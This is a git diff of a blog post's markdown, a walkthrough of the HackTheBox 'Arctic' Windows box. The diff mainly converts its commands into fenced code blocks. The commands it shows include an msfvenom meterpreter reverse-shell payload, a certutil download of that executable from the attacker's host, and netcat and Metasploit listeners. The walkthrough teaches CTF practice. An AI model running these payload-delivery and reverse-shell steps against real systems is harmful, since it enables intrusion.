@@ -6,14 +6,13 @@ tags = [
   "writeup",
   "ctf",
 ]
-categories = [
-  "hackthebox"
-]
 highlight = "true"
 toc = "true"
+showdate = "true"
 +++
-
+{{%summary%}}
 ![1](/images/arctic-writeup/1.png)
+{{%/summary%}}
 
 Arctic is an easy rated Windows hacking challenge from HackTheBox, here is a writeup/walkthrough to go from boot to root. This box is all about publicly available exploits and known unpatched vulnerabilities.
 
@@ -63,7 +62,9 @@ The exploit continues but what is important to note are the parts I enclosed in 
 
 From this we can see that Metasploit already set the correct interface as the IP address to connect the box to, and it will connect to us on port 4444 so let's start a netcat listener on our attacking box to receive the connection:
 
-    $ nc -lvp 4444
+```shell-session
+$ nc -lvp 4444
+```
 
 Then we can forward the request on Burp, and load the URL of the uploaded file, which will be located in /userfiles/file/VTBMWLQ.jsp:
 
@@ -87,20 +88,27 @@ Now we have to think about becoming administrators on the box. First things firs
 
 So we are dealing with Windows Server 2008 R2 Standard, 64-bits. With this info we can pass from a normal cmd shell to a meterpreter shell to have access to all its useful modules. I'll be doing it by dropping an executable on the system (I tried the TrustedSec Unicorn method but for some reason it wouldn't work on this box even though it's supposed to? I dunno) crafted from msfvenom:
 
-    $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.29 LPORT=9090 -f exe > arctic.exe
+```shell-sessuib
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.29 LPORT=9090 -f exe > arctic.exe
+```
 
 Then in order to drop it on the box we must start a local webserver on our local machine, I like to do it with PHP:
 
-    $ php -S 0.0.0.0:8181 -t .
-
+```shell-session
+$ php -S 0.0.0.0:8181 -t .
+```
 
 Now we can download the file from our machine using certutil.exe with a command like this:
 
-    $ certutil.exe -urlcache -split -f "http://10.10.14.29:9090/arctic.exe" arctic.exe
+```shell-session
+$ certutil.exe -urlcache -split -f "http://10.10.14.29:9090/arctic.exe" arctic.exe
+```
 
 This will save the executable in our current directory so we can run it and enjoy our meterpreter shell after starting a listener on Metasploit:
 
-    $ arctic.exe
+```shell-session
+$ arctic.exe
+```
 
 ![7](/images/arctic-writeup/15.png)
 
@@ -108,7 +116,9 @@ This will save the executable in our current directory so we can run it and enjo
 
 For some reason Metasploit failed to load its library containing all the commands so it would give me errors no matter what I tried to do, so I had to load stdapi manually:
 
-    meterpreter> load stdapi
+```shell-session
+meterpreter> load stdapi
+```
 
 Then it started to work normally. By running "sysinfo" we can view some information about the system and our meterpreter session, one of these tells us we are actually running a x86 version of meterpreter on a 64 bits OS so this might give us inaccurate results when we run post exploitation modules:
 
@@ -128,11 +138,15 @@ And the process migration is successful as we can see from the output of sysinfo
 
 Now we can finally use a very useful post exploitation module that looks for missing hot fixes making the system vulnerable to local privilege escalation exploits, the module is called post/multi/recon/local_exploit_suggester and we can use it by pressing Ctrl+Z to put our meterpreter session in the background, typing the following command on the msf console:
 
-    msf> use post/multi/recon/local_exploit_suggester
+```shell-session
+msf> use post/multi/recon/local_exploit_suggester
+```
 
 And then specify on what session to run the module:
 
+```shell-session
     msf> set session 1
+```
 
 And launch it:
 
